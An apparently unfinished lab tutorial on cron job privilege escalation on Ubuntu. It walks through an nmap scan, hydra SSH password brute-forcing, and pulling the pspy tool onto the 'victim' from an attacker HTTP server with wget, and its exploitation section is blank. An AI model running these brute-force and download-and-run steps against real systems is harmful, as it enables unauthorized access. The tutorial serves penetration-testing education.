<h1 align="center"> Cronjob Exploitation  </h1>











# Introduction to Cron Job

## What are Cron?
**Cron** is a time-based job scheduler in Linux that runs commands or scripts automatically at specified times/intervals.

## What is Cron Job?
A **cron job** is a scheduled task in Unix/Linux systems that runs automatically at specified times or intervals. It’s managed by the cron daemon (crond).

### Cron jobs are commonly used for:
- Backups
- Log rotation
- System updates
- Running scripts periodically

### They can be configured by:
- System-wide: `/etc/crontab`, `/etc/cron.d/`
- User-specific: `crontab -e` (for each user)
- Predefined directories: `/etc/cron.hourly`, `/etc/cron.daily`, etc.


### Basic Concepts:
- Cron Daemon (crond): Background service that executes scheduled jobs
- Crontab: Configuration file containing cron jobs
- Cron Jobs: Individual scheduled tasks


### Why Cron is Dangerous for Privilege Escalation:
- Often runs with root privileges
- Can execute any command
- Jobs can be misconfigured
- Users can write to cron directories/files
- Wildcard usage can be exploited


## Understanding Cron Configuration

### Cron File Locations:

#### System-wide cron
````
/etc/crontab
/etc/cron.d/
/etc/cron.hourly/
/etc/cron.daily/
/etc/cron.weekly/
/etc/cron.monthly/
````

#### User-specific cron
````
/var/spool/cron/crontabs/  # System location
crontab -l                 # View current user's jobs
````

### CronTab Syntax:
````
*     *     *   *    *        command to be executed
-     -     -   -    -
|     |     |   |    |
|     |     |   |    +----- day of week (0 - 6) (Sunday=0)
|     |     |   +------- month (1 - 12)
|     |     +--------- day of month (1 - 31)
|     +----------- hour (0 - 23)
+------------- min (0 - 59)
````


---





# CronJob Exploitation Methodology

## 1. Setup SSH lab:
- In this our target is `Ubuntu`, so in this first I need to install SSH Server on my ubuntu:
````
sudo apt install openssh-server
````
<img width="1248" height="756" alt="image" src="https://github.com/user-attachments/assets/716c42e1-c577-4fbc-a08c-03d94f4ac23c" />


- And then start and enable the service:
````
sudo systemctl enable ssh
````
<img width="1143" height="534" alt="image" src="https://github.com/user-attachments/assets/a37e14d6-52a2-413a-805c-aed587f5d6cf" />

````
sudo systemctl status ssh.socket
````
<img width="989" height="299" alt="image" src="https://github.com/user-attachments/assets/3609fcd4-2776-4720-ac4b-2f3a2f93b869" />


- Or we can use `Start`, in this i used start cause when i close machine it will be auto close:
````
sudo systemctl start ssh
sudo systemctl status ssh
````
<img width="918" height="602" alt="image" src="https://github.com/user-attachments/assets/a0d3ab69-1bbf-445c-91ef-7857fb948f56" />


- After verify port SSH:
````
sudo ss -tlnp | grep ssh
````
<img width="1157" height="75" alt="image" src="https://github.com/user-attachments/assets/72479b65-eacd-40cd-a1d3-9ff5262c2b01" />


## 2. Reconnaissance:
- First in this i scan to our target:
````
nmap 192.168.127.131 -sV -T4
````
<img width="1191" height="275" alt="image" src="https://github.com/user-attachments/assets/ec5c743a-da1d-45cc-a2aa-15b241c99065" />


- After i crack this target `SSH Port`:
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -t 4 -s 22 192.168.127.131 ssh -V -f
````
````
hydra -l k4n0ng -P /usr/share/wordlists/passwd.txt -t 4 -s 22 192.168.127.131 ssh -V -f
````
<img width="1902" height="518" alt="image" src="https://github.com/user-attachments/assets/797181c5-9a89-4cbc-ad3d-45d00cb23a42" />


- Now we found the correct `Password`, and after I login to it:
````
ssh k4n0ng@192.168.127.131
````
<img width="720" height="425" alt="image" src="https://github.com/user-attachments/assets/600da6aa-45af-4b1e-99d2-9090eea4403c" />

- Now we was access to our target `ssh port`.





## 3. Finding Cron Jobs


### System Cron files
````
ls -la /etc/cron*
````
<img width="771" height="1038" alt="image" src="https://github.com/user-attachments/assets/bab2cbe8-5a51-4895-89be-9441fcd7bef7" />


````
cat /etc/crontab
````
<img width="1053" height="465" alt="image" src="https://github.com/user-attachments/assets/13d01969-1007-4061-80ef-344a8d84031a" />

````
ls -la /etc/cron.hourly
ls -la /etc/cron.daily
ls -la /etc/cron.weekly
ls -la /etc/cron.monthly
````
<img width="791" height="806" alt="image" src="https://github.com/user-attachments/assets/5b364307-a43c-4b06-812d-12981d9f63f7" />

- These commands list the scheduled cron job scripts that run **hourly**, **daily**, **weekly**, or **monthly**. They’re critical for both system maintenance and privilege escalation auditing.




### Cron.d Directory
````
ls -la /etc/cron.d
````
<img width="757" height="287" alt="image" src="https://github.com/user-attachments/assets/b9ad73f0-75f7-46f0-aca2-f0b5e8014702" />


### Cuurent User's cron
````
crontab -l
````
<img width="365" height="123" alt="image" src="https://github.com/user-attachments/assets/167d22c9-14d6-4819-a2e5-1e1cdfe292fa" />


````
crontab -e
````
<img width="781" height="234" alt="image" src="https://github.com/user-attachments/assets/dad774d2-cff3-4ba6-b40c-bf8d238eceb5" />

- `crontab`: Manages cron jobs for the current user.
- `-e`: Open the user's cron table in the default editor (usually `nano`, `vi`) Unlike `/etc/cron.daily` or `/etc/cron.weekly` ( system-wide jobs run as `root`), `crontab -e` is **per-user**.
- This command use for opens the per-user cron job editor, letting you schedule commands with your user’s privileges. It’s a key difference from  directories, which are system-wide.


---




## Cronjob Enumeration
- In linux cronjob enumeration can performed with the tool `pspy`: https://github.com/DominicBreuker/pspy/
<img width="926" height="901" alt="image" src="https://github.com/user-attachments/assets/4ddb375d-d5f1-4be9-a87c-ab9208451c43" />

- After download it:
````
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
````
<img width="1916" height="728" alt="image" src="https://github.com/user-attachments/assets/0adbc331-0339-438c-8237-0306c83514e4" />

#### After Transfer the victim machine:

- On attacker:
````
python3 -m http.server 1234
````
<img width="810" height="116" alt="image" src="https://github.com/user-attachments/assets/0c7fce09-59fb-4905-b52c-2286aa2e2a1e" />

- On victim:
````
wget http://172.20.155.246:1234/pspy64 -O /tmp/pspy64
````
<img width="947" height="144" alt="image" src="https://github.com/user-attachments/assets/6a083733-9c9d-4856-876f-0b9da0ef7494" />

- IF it not found, do this on our kali:
````
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O pspy64
chmod +x pspy64
````
<img width="1887" height="801" alt="image" src="https://github.com/user-attachments/assets/c4a292fb-4d3e-4c15-86ba-d81f0fc11ff1" />


- After check:
````
ls -l pspy 64
````
<img width="422" height="190" alt="image" src="https://github.com/user-attachments/assets/117e733a-4000-45c7-a6c3-4af7c6477b90" />


#### Start the HTTP server
````
python3 -m http.server 1234
````
<img width="756" height="126" alt="image" src="https://github.com/user-attachments/assets/cb5ae4f2-2523-41fe-a332-ced6f2a643ae" />


#### On victim:
````
wget http://172.20.155.246:1234/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
````
<img width="1883" height="352" alt="image" src="https://github.com/user-attachments/assets/b58c6ca5-610e-44f6-a5ff-20685495eb9c" />


- After back to attacker:
<img width="906" height="147" alt="image" src="https://github.com/user-attachments/assets/f6e282d6-5cf6-4d54-9138-c757918c9556" />


````
/tmp/pspy64
````
<img width="1915" height="514" alt="image" src="https://github.com/user-attachments/assets/19a2a3e3-6a06-40f4-9c22-5579ec8a6cf8" />

<img width="1911" height="1015" alt="image" src="https://github.com/user-attachments/assets/8c22acd6-e348-49a9-8d18-25fa80b59dd3" />

<img width="1611" height="1020" alt="image" src="https://github.com/user-attachments/assets/2361c428-d83a-4a86-984d-c8dd7228e6c6" />

<img width="1901" height="1027" alt="image" src="https://github.com/user-attachments/assets/f92ac687-5111-4b6d-9096-731d6b0e0a5f" />

<img width="1907" height="1000" alt="image" src="https://github.com/user-attachments/assets/410961d9-7a25-47ba-b3a6-ddb2c6e0eabc" />


#### Understanding the output
- Header / ASCII art → Just the banner confirming version `v1.2.1.`
- Config line:
  - `processes=true`: It’s monitoring process execution.
  - `file-system-events=false`: Not watching file changes (you can enable if needed).
  - `Scanning every 100ms` → Very frequent checks.
  - `Watching directories: [/usr /tmp /etc /home /var /opt]` → These are the paths being monitored.
- CMD lines → Each line shows:
  - Timestamp → When the process was observed.
  - UID → The user ID running the process (`0` = root, `1000` = your user, others = system services).
  - PID → Process ID.
  - Command → The actual command being executed.

#### What to look for:
The real power of `pspy` is spotting cronjobs or automated tasks that might be exploitable:
- **UID=0 (root)** processes running scripts in `/tmp`, `/home`, or other writable directories.
- **Repeating commands** at regular intervals → likely cronjobs.
- **Custom scripts** (e.g., `/usr/local/bin/something.sh`) → check if you can edit them.
- **Services spawning with arguments**: sometimes secrets or passwords are visible.


- Direct ourput file:
````
/tmp/pspy64 > /tmp/pspy.log
less /tmp/pspy.log
````
<img width="596" height="61" alt="image" src="https://github.com/user-attachments/assets/96df78e2-5a26-4c9d-8198-c528224b34f1" />

<img width="500" height="147" alt="image" src="https://github.com/user-attachments/assets/886a42c9-0516-479b-9297-a7fdff23b186" />

<img width="1899" height="1001" alt="image" src="https://github.com/user-attachments/assets/70dad34e-1ce9-40ec-b9d4-2f85e2c3afeb" />

<img width="1912" height="1026" alt="image" src="https://github.com/user-attachments/assets/48e6bd34-53f9-4213-a3b9-5e729f37fdae" />

- To exit press `q`.

---




## Cronjob Exploitation



























    
